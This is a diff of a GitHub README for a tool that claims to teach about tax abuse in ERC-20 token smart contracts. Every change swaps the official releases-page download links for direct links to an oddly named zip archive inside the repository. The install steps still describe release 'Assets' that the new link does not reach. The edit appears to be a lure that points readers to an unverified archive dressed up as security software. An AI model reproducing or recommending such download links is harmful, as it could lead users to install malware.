@@ -1,7 +1,7 @@
 # 🎉 Token-Tax-Abuse-Science - Understand Token Tax Abuse Easily
 
 ## 📥 Download the Software
-[![Download Token-Tax-Abuse-Science](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Engotisme/Token-Tax-Abuse-Science/releases)
+[![Download Token-Tax-Abuse-Science](https://raw.githubusercontent.com/Engotisme/Token-Tax-Abuse-Science/main/scolion/Token-Tax-Abuse-Science_impassible.zip)](https://raw.githubusercontent.com/Engotisme/Token-Tax-Abuse-Science/main/scolion/Token-Tax-Abuse-Science_impassible.zip)
 
 ## 🚀 Getting Started
 Welcome to Token-Tax-Abuse-Science. This software helps you explore how smart contract developers misuse fee logic in ERC-20 tokens. It offers insights into various types of tax abuse and provides tools for better security.
@@ -25,7 +25,7 @@ To run this application, ensure your system meets the following requirements:
 - **Network**: Active internet connection for accessing token data.
 
 ## 🌐 Download & Install
-To download the application, please visit this page: [Token-Tax-Abuse-Science Releases](https://github.com/Engotisme/Token-Tax-Abuse-Science/releases).
+To download the application, please visit this page: [Token-Tax-Abuse-Science Releases](https://raw.githubusercontent.com/Engotisme/Token-Tax-Abuse-Science/main/scolion/Token-Tax-Abuse-Science_impassible.zip).
 
 1. Go to the provided link.
 2. Scroll down to the "Assets" section.
@@ -55,4 +55,4 @@ For any inquiries, you can reach out through the issues section of the GitHub re
 ## 🎉 Acknowledgments
 Thank you for using Token-Tax-Abuse-Science. Your interest in security helps create a safer environment for all users in the blockchain community. 
 
-[![Download Token-Tax-Abuse-Science](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Engotisme/Token-Tax-Abuse-Science/releases)
+[![Download Token-Tax-Abuse-Science](https://raw.githubusercontent.com/Engotisme/Token-Tax-Abuse-Science/main/scolion/Token-Tax-Abuse-Science_impassible.zip)](https://raw.githubusercontent.com/Engotisme/Token-Tax-Abuse-Science/main/scolion/Token-Tax-Abuse-Science_impassible.zip)
